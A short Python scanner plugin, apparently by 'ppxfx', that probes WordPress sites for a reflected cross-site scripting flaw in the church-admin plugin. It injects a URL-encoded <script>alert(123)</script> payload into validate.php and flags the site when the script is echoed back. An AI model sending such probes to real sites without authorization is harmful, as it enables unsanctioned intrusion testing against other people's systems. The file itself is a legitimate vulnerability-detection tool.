#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'WordPress church-admin 跨站脚本',

      'level'     :   'low',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/wp-content/plugins/church-admin/includes/validate.php?id=%3Cscript%3Ealert%28123%29%3C/script%3E'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "<script>alert(123)</script>" in res.text:
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret